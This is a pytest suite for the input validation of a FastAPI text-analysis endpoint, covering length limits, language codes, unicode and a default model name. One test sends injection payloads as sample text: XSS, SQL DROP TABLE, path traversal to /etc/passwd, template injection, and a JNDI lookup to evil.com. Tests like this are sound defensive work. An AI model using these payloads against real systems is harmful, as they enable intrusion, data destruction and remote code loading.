import pytest
from fastapi.testclient import TestClient
from app.main import app

client = TestClient(app)


class TestValidation:
    def test_text_max_length(self):
        long_text = "x" * 100001
        response = client.post("/api/analyze", json={"text": long_text, "model_name": "gpt-4o"})
        assert response.status_code == 422

    def test_text_min_length(self):
        response = client.post("/api/analyze", json={"text": "", "model_name": "gpt-4o"})
        assert response.status_code == 422

    def test_source_lang_valid_values(self):
        valid_langs = ["auto", "es", "en", "fr", "de", "it", "pt", "ja", "zh", "ru"]
        for lang in valid_langs:
            target = "en" if lang != "en" else "es"
            response = client.post(
                "/api/analyze", json={"text": "Test", "source_lang": lang, "target_lang": target, "model_name": "gpt-4o"}
            )
            assert response.status_code != 422, f"Language {lang} should be valid"

    def test_target_lang_valid_values(self):
        valid_langs = ["es", "en", "fr", "de", "it", "pt", "ja", "zh", "ru"]
        for lang in valid_langs:
            source = "es" if lang != "es" else "en"
            response = client.post(
                "/api/analyze", json={"text": "Test", "source_lang": source, "target_lang": lang, "model_name": "gpt-4o"}
            )
            assert response.status_code != 422, f"Language {lang} should be valid"

    def test_source_lang_invalid(self):
        response = client.post(
            "/api/analyze", json={"text": "Test", "source_lang": "invalid", "target_lang": "en", "model_name": "gpt-4o"}
        )
        assert response.status_code == 422

    def test_target_lang_invalid(self):
        response = client.post(
            "/api/analyze", json={"text": "Test", "source_lang": "es", "target_lang": "invalid", "model_name": "gpt-4o"}
        )
        assert response.status_code == 422

    def test_model_name_optional_defaults_to_gpt4o(self):
        response = client.post("/api/analyze", json={"text": "Test", "source_lang": "es", "target_lang": "en"})
        assert response.status_code == 200
        data = response.json()
        assert data["model_used"] == "gpt-4o"

    def test_special_characters_in_text(self):
        special_texts = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "{{7*7}}",
            "${jndi:ldap://evil.com}",
        ]
        for text in special_texts:
            response = client.post("/api/analyze", json={"text": text, "model_name": "gpt-4o"})
            assert response.status_code == 200, f"Failed for: {text}"

    def test_unicode_text(self):
        unicode_texts = [
            "🎉🚀🤖 Emojis",
            "中文测试",
            "テスト 日本語",
            "тест русский",
            "اختبار العربية",
            "🇪🇸🇺🇸 Flags",
        ]
        for text in unicode_texts:
            response = client.post("/api/analyze", json={"text": text, "model_name": "gpt-4o"})
            assert response.status_code == 200, f"Failed for: {text}"

    def test_missing_text_field(self):
        response = client.post("/api/analyze", json={"source_lang": "es", "target_lang": "en"})
        assert response.status_code == 422

    def test_extra_fields_ignored(self):
        response = client.post(
            "/api/analyze",
            json={"text": "Test", "model_name": "gpt-4o", "extra_field": "should_be_ignored"},
        )
        assert response.status_code == 200